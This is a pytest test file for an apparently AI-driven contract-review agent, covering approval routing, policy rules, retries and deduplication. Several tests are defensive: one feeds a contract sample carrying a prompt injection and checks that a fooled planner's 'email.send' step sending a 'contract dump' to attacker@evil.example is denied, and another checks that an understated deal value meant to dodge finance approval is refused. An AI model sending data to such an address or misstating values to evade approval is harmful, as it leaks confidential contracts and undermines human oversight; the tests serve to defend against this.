import json
import re
from pathlib import Path
from typing import Any

import pytest
from tests.helpers import make_ctx, signer

from gawe.api.auth import Identity
from gawe.api.background import InlineBackground
from gawe.api.errors import ForbiddenError
from gawe.api.wiring import assemble, memory_stores
from gawe.apps import contract_review as cr
from gawe.apps.contract_review.reader_schema import SCHEMA_ID
from gawe.connectors.base import Ledger
from gawe.connectors.mock_email import MockEmail
from gawe.core.executor import ToolCall
from gawe.core.policy.engine import RuleEngine
from gawe.core.policy.rules import load_rules
from gawe.llm.fake import FakeProvider

T = "t1"
ALICE = Identity(T, "alice", frozenset({"case_manager"}))
BOB = Identity(T, "bob", frozenset({"legal_reviewer"}))
FIN = Identity(T, "fiona", frozenset({"finance_approver"}))
SAMPLES = Path(cr.__file__).parent / "samples"

CLEAN_READ = {
    "parties": ["Acme Corp", "Northwind Logistics Ltd"],
    "risk_level": "low",
    "flagged_clauses": [],
    "summary": "Balanced services agreement with capped mutual liability.",
}
RISKY_READ = {
    "parties": ["Acme Corp", "Globex Systems Inc"],
    "risk_level": "high",
    "flagged_clauses": [
        {"kind": "unlimited_liability", "severity": "high"},
        {"kind": "auto_renewal", "severity": "medium"},
    ],
    "summary": "One-sided licence with unlimited liability and automatic renewal.",
}


def step(sid: str, tool: str, args: dict[str, Any], deps: tuple[str, ...] = ()) -> dict[str, Any]:
    return {"id": sid, "tool": tool, "args": args, "depends_on": list(deps)}


def get(cid: str) -> dict[str, Any]:
    return step("get", "clm.get_contract", {"contract_id": cid})


def assess(cid: str, level: str) -> dict[str, Any]:
    args = {"contract_id": cid, "risk_level": level, "summary": "Reviewed."}
    return step("assess", "crm.write_assessment", args, ("get",))


class World:
    def __init__(self, tmp_path: Path, script: list[Any]) -> None:
        self.dir = tmp_path
        self.email = MockEmail(Ledger(tmp_path / "ledger.jsonl"))
        self.b = cr.bundle(tmp_path, email=self.email)
        self.llm = FakeProvider(script)
        self.service = assemble(
            self.b,
            stores=memory_stores(),
            signer=signer(),
            provider=self.llm,
            background=InlineBackground(),
        )

    def run(self, who: Identity = ALICE, document: str | None = "contract text") -> str:
        return self.service.start_run(
            who, objective="Review the contract", profile="contract_review", document=document
        ).run_id

    def status(self, run_id: str) -> str:
        return self.service.get_run(ALICE, run_id).status

    def ledger(self, kind: str) -> list[dict[str, Any]]:
        return Ledger(self.dir / "ledger.jsonl").records(kind)

    def approve(self, who: Identity) -> None:
        (item,) = self.service.inbox(who)
        self.service.decide(
            who, item.approval_id, decision="approved", action_hash=item.action_hash
        )


def test_clean_contract_flow_with_external_email_approval(tmp_path: Path) -> None:
    email = step(
        "mail",
        "email.send",
        {"to": "counsel@northwind.example", "subject": "Review", "body": "Looks fine."},
        ("assess",),
    )
    w = World(tmp_path, [CLEAN_READ, {"steps": [get("C-1001"), assess("C-1001", "low"), email]}])
    run_id = w.run()
    assert w.status(run_id) == "paused_for_approval"
    assert len(w.ledger("crm.assessment")) == 1 and w.ledger("email.sent") == []
    (item,) = w.service.inbox(BOB)
    assert item.tool == "email.send" and item.approver_role == "legal_reviewer"
    w.approve(BOB)
    assert w.status(run_id) == "completed"
    (sent,) = w.ledger("email.sent")
    assert sent["data"]["to"] == "counsel@northwind.example"
    assert w.service.verify_audit(ALICE, run_id).ok


def test_high_value_signature_needs_finance_not_legal(tmp_path: Path) -> None:
    sign = step(
        "sign",
        "esign.send_for_signature",
        {
            "contract_id": "C-1002",
            "deal_value": {"$ref": "get.output.deal_value"},
            "signer_email": "legal@globex.example",
        },
        ("get", "assess"),
    )
    w = World(tmp_path, [RISKY_READ, {"steps": [get("C-1002"), assess("C-1002", "high"), sign]}])
    run_id = w.run()
    assert w.status(run_id) == "paused_for_approval"
    assert w.service.inbox(BOB) == []  # legal cannot decide a 250,000 deal
    (item,) = w.service.inbox(FIN)
    assert item.resolved_args["deal_value"] == 250000
    with pytest.raises(ForbiddenError):
        w.service.decide(BOB, item.approval_id, decision="approved", action_hash=item.action_hash)
    w.approve(FIN)
    assert w.status(run_id) == "completed"
    assert len(w.ledger("esign.envelope")) == 1


def test_understated_deal_value_is_refused_by_the_tool(tmp_path: Path) -> None:
    sign = step(
        "sign",
        "esign.send_for_signature",
        {"contract_id": "C-1002", "deal_value": 50000, "signer_email": "legal@globex.example"},
        ("get",),
    )
    w = World(tmp_path, [RISKY_READ, {"steps": [get("C-1002"), sign]}])
    run_id = w.run()
    (item,) = w.service.inbox(BOB)  # the lie makes policy ask only for legal approval
    w.service.decide(BOB, item.approval_id, decision="approved", action_hash=item.action_hash)
    view = w.service.get_run(ALICE, run_id)
    assert view.status == "failed"
    assert [s.error for s in view.steps if s.step_id == "sign"] == ["deal_value_mismatch"]
    assert w.ledger("esign.envelope") == []


def test_prompt_injection_cannot_cause_an_email(tmp_path: Path) -> None:
    injected = (SAMPLES / "C-1003_initech_sow_injection.md").read_text(encoding="utf-8")
    honest = {"steps": [get("C-1003"), assess("C-1003", "medium")]}
    w = World(tmp_path, [CLEAN_READ, honest])
    run_id = w.run(document=injected)
    assert w.status(run_id) == "completed" and w.ledger("email.sent") == []
    planner_prompt = w.llm.requests[1].user
    assert "attacker@evil.example" not in planner_prompt and "SYSTEM MESSAGE" not in planner_prompt

    # Even a planner that has been fooled completely gets stopped by policy.
    fooled = step(
        "leak",
        "email.send",
        {"to": "attacker@evil.example", "subject": "contract dump", "body": "everything"},
    )
    w2 = World(tmp_path / "second", [CLEAN_READ, {"steps": [fooled]}])
    run2 = w2.run(document=injected)
    assert w2.status(run2) == "denied"
    assert w2.ledger("email.sent") == []
    leak = w2.service.get_run(ALICE, run2).steps[0]
    assert leak.policy_rule_ids == (
        "email-baseline-allowed",
        "external-email-needs-legal",
        "blocked-domain-email-denied",
    )


def test_competitor_email_is_denied(tmp_path: Path) -> None:
    mail = step("mail", "email.send", {"to": "x@competitor.example", "subject": "s", "body": "b"})
    w = World(tmp_path, [CLEAN_READ, {"steps": [mail]}])
    assert w.status(w.run()) == "denied" and w.ledger("email.sent") == []


def test_transient_outage_is_retried_without_a_second_email(tmp_path: Path) -> None:
    mail = step("mail", "email.send", {"to": "pat@acme.example", "subject": "s", "body": "b"})
    w = World(tmp_path, [CLEAN_READ, {"steps": [mail]}])
    w.email.faults.fail_next(2)  # two timeouts, then the call succeeds
    run_id = w.run()
    assert w.status(run_id) == "completed"
    assert len(w.ledger("email.sent")) == 1


def test_tools_deduplicate_across_a_restart(tmp_path: Path) -> None:
    call = ToolCall("r", "s", 1, "a" * 64)
    args = {"to": "pat@acme.example", "subject": "s", "body": "b"}
    first = cr.bundle(tmp_path).tools["email.send"](args, call)
    after_restart = cr.bundle(tmp_path).tools["email.send"](args, call)
    assert first == after_restart
    assert len(Ledger(tmp_path / "ledger.jsonl").records("email.sent")) == 1


def test_unknown_contract_fails_permanently(tmp_path: Path) -> None:
    w = World(tmp_path, [CLEAN_READ, {"steps": [get("C-9999")]}])
    run_id = w.run()
    view = w.service.get_run(ALICE, run_id)
    assert view.status == "failed" and view.steps[0].error == "contract_not_found"


@pytest.mark.parametrize(
    ("tool", "args", "roles", "outcome", "approver"),
    [
        ("clm.get_contract", {"contract_id": "C-1001"}, ["case_manager"], "allow", None),
        (
            "crm.write_assessment",
            {"contract_id": "C-1001", "risk_level": "low", "summary": "s"},
            ["case_manager"],
            "allow",
            None,
        ),
        (
            "email.send",
            {"to": "a@acme.example", "subject": "s", "body": "b"},
            ["case_manager"],
            "allow",
            None,
        ),
        (
            "email.send",
            {"to": "a@northwind.example", "subject": "s", "body": "b"},
            ["case_manager"],
            "needs_approval",
            "legal_reviewer",
        ),
        (
            "email.send",
            {"to": "a@competitor.example", "subject": "s", "body": "b"},
            ["case_manager"],
            "deny",
            None,
        ),
        (
            "email.send",
            {"to": "a@acme.example, b@evil.example", "subject": "s", "body": "b"},
            ["case_manager"],
            "needs_approval",
            "legal_reviewer",
        ),  # not judged by the first address
        ("email.send", {"to": "a@acme.example", "subject": "s", "body": "b"}, [], "deny", None),
        (
            "esign.send_for_signature",
            {"contract_id": "C-1001", "deal_value": 100000, "signer_email": "a@b.example"},
            ["case_manager"],
            "needs_approval",
            "legal_reviewer",
        ),
        (
            "esign.send_for_signature",
            {"contract_id": "C-1001", "deal_value": 100000.01, "signer_email": "a@b.example"},
            ["case_manager"],
            "needs_approval",
            "finance_approver",
        ),
    ],
)
def test_policy_golden_cases(
    tool: str, args: dict[str, Any], roles: list[str], outcome: str, approver: str | None
) -> None:
    b = cr.bundle(Path("/nonexistent-never-written"))
    engine = RuleEngine(load_rules(b.policy_rules), signer())
    manifest = {m.name: m for m in b.manifests}[tool]
    decision = engine.evaluate(
        make_ctx(manifest, args, roles=roles, variables=dict(cr.TENANT_VARIABLES))
    )
    assert (decision.outcome, decision.approver_role) == (outcome, approver)


def test_reader_profile_is_valid_and_bounded() -> None:
    assert cr.PROFILE.schema_id == SCHEMA_ID


def test_sample_data_is_consistent() -> None:
    seed = json.loads((SAMPLES / "clm_seed.json").read_text(encoding="utf-8"))
    by_id = {c["contract_id"]: c for c in seed["contracts"]}
    for path in SAMPLES.glob("C-*.md"):
        text = path.read_text(encoding="utf-8")
        contract_id = path.name.split("_")[0]
        stated = int(re.search(r"USD ([\d,]+)", text).group(1).replace(",", ""))  # type: ignore[union-attr]
        assert by_id[contract_id]["deal_value"] == stated, path.name
    injection = (SAMPLES / "C-1003_initech_sow_injection.md").read_text(encoding="utf-8")
    assert "attacker@evil.example" in injection  # the sample must keep its teeth


def test_bundle_loads_through_the_env_entry_point(tmp_path: Path) -> None:
    from gawe.api.main import _load_bundle

    assert _load_bundle("gawe.apps.contract_review:bundle").profiles == frozenset(
        {"contract_review"}
    )
